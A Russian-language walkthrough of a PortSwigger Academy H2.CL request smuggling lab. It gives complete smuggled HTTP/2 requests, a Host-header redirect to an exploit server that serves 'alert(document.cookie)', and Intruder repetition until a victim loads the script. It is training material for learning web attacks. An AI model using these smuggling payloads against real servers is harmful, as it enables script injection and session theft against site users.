Перейдем на уязвимый ресурс

найдем запрос на корневую страницу и отправим ее в `Repeater`
сконфигурируем запрос 
```
POST / HTTP/2
Host: 0a19003803f69a0f80661c9f009e0016.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /ashjifbasuifbasfbnuaisbfuiabsf HTTP/1.1
X-ignore: x
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/1.png)

и отправим второй в догонку
```
GET /resources/js/analyticsFetcher.js HTTP/2
Host: 0a19003803f69a0f80661c9f009e0016.web-security-academy.net
Cookie: session=kA4kBIRQr16nqpdOfSbQ9tG4XoBqnppb
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a19003803f69a0f80661c9f009e0016.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```



и в ответ получим 404 Not Found

Это все потому, что прошлый запрос у нас отобразится для приложения как 
```
POST / HTTP/2
Host: 0a19003803f69a0f80661c9f009e0016.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /ashjifbasuifbasfbnuaisbfuiabsf HTTP/1.1
X-ignore: xGET /resources/js/analyticsFetcher.js HTTP/2
Host: 0a19003803f69a0f80661c9f009e0016.web-security-academy.net
Cookie: session=kA4kBIRQr16nqpdOfSbQ9tG4XoBqnppb
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a19003803f69a0f80661c9f009e0016.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/2.png)

Далее найдем обращение к рандомному .js файлу внутри, и изменим его на несуществущий путь и увидим, что происходит редирект 

```
GET /resources/js/ 
```
и в ответ получим
`Location: https://0a19003803f69a0f80661c9f009e0016.web-security-academy.net/resources/js/HTTP/2/`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/3.png)

Причем если мы изменим host на example.com
```
GET /resources/js HTTP/2
Host: example.com
 ```
то мы получим 421 ошибку
```
HTTP/2 421 Misdirected Request
Content-Length: 12

Invalid host
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/4.png)

Идея состоит в том, чтобы перенаправить на наш эксплойт сервер при обращении к файлу

Перейдем в Exploit server и сконфигурируем

`exploit-0a570096037a9ad980431b3c018300e3.exploit-server.net/esources/js`

`/esources/js`
`alert(document.cookie)`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/5.png)

Изменим наш изначальный запрос на 
```
POST / HTTP/2
Host: 0a19003803f69a0f80661c9f009e0016.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /resources/js HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3


x=
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/6.png)

и вторым запросом отправим обычный запрос на корневую страницу

и увидим желанный редирект на `https://example.com/resources/js/`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/7.png)

Им и воспользуемся

```
POST / HTTP/2
Host: 0a19003803f69a0f80661c9f009e0016.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /resources/js HTTP/1.1
Host: exploit-0a570096037a9ad980431b3c018300e3.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```
я загнал это все в `интрудер`, прождал минут 20 пока все выполнится и получил уведомление об успешно сделанной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/8.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/9.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/10.png)
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/12.%20H2.CL%20request%20smuggling/pics%20for%20walkthrough/11.png)
